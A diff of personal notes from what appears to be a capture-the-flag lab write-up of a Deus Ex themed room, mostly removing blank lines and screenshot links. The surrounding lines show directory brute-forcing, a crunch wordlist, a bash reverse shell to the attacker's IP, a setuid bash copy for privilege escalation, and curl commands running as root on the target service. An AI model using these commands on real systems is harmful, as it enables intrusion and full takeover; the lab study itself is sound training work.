@@ -135,9 +135,7 @@ Progress: 72285 / 1102805 (6.55%)^C
 2023/01/13 18:12:25 Finished
 ===============================================================
 
-
 http://10.10.179.68/terrorism.html#freedom
-
 
 Stopping Terror - A New Perspective on Freedom
 
@@ -148,7 +146,6 @@ We are close to achieving this goal. Some would say that human liberty has been 
 - Anna Navarre, Agent, UNATCO
 
 http://10.10.179.68/threats.html
-
 
 Know Your Enemy - The Triads
 
@@ -364,7 +361,6 @@ or maybe crunch
 
 `crunch` is a command line tool that can be used to generate a wordlist of custom character sets and lengths. You can generate the same wordlist using crunch using the following command:
 
-
 `crunch 4 4 0123456789 -o wordlist2`
 
 -   `4` is the minimum length of the generated words.
@@ -414,7 +410,6 @@ Progress: 2836 / 50005 (5.67%)^C
 2023/01/13 21:37:03 Finished
 ===============================================================
 
-
 ---
 
 using remmina to connect (VNC : 10.10.179.68:5901) and enter pass
@@ -463,8 +458,6 @@ drwxr-xr-x 20 ajacobson ajacobson 4.0K Jan 14 00:15 ..
 C:\home\ajacobson\Desktop> file badactors-list 
 badactors-list: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9bf588974cd2b3b7c2db34d49d3df7aec3a76dc, for GNU/Linux 3.2.0, not stripped
 
-
-
 revshell
 
 C:\home\ajacobson\Desktop> bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
@@ -477,13 +470,11 @@ Ncat: Listening on 0.0.0.0:1337
 Ncat: Connection from 10.10.37.31.
 Ncat: Connection from 10.10.37.31:52068.
 
-
 Microsoft(R) Windows 95
    (C)Copyright Microsoft Corp 1981-1996.
 
 C:\home\ajacobson\Desktop> python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
 
 Microsoft(R) Windows 95
    (C)Copyright Microsoft Corp 1981-1996.
@@ -525,7 +516,6 @@ badactors  badactors-list
 └─$ ./badactors-list                  
 Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
 2023/01/13 19:26:09 Post "http://UNATCO:23023": dial tcp: no such host
-
 
 adding to /etc/host
 
@@ -584,7 +574,6 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 to
 
-
 cp /bin/bash /tmp/w  && chmod +s /tmp/w
 
 ┌──(kali㉿kali)-[~]
@@ -595,7 +584,6 @@ Type "help", "copyright", "credits" or "license" for more information.
 39
 
 now replace it (ctrl + w to search in nano.. search base64 then replace)
-
 
 ┌──(kali㉿kali)-[~/nappy/DX1]
 └─$ python3 -m http.server 8000
@@ -719,7 +707,6 @@ Accept-Encoding: gzip
 
 directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt
 
-
 ┌──(kali㉿kali)-[~/nappy]
 └─$ curl -XPOST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' -d 'directive=whoami' UNATCO:23023
 root
@@ -740,20 +727,6 @@ office after you've been debriefed by Manderley.
 
 ```
 
-![[Pasted image 20230113185314.png]]
-
-![[Pasted image 20230113190605.png]]
-![[Pasted image 20230113190927.png]]
-
-![[Pasted image 20230113191112.png]]
-
-![[Pasted image 20230113191815.png]]
-
-![[Pasted image 20230113192827.png]]
-
-![[Pasted image 20230113193423.png]]
-![[Pasted image 20230113202113.png]]
-
 What is the User flag?  
 
 If you get locked out, restart either the target or your attack box for a new IP.
@@ -771,6 +744,5 @@ The theme used for XFCE is [https://github.com/grassmunk/Chicago95](https://git
 Answer the questions below
 
 Thanks!
-
 
 [[Brute]]
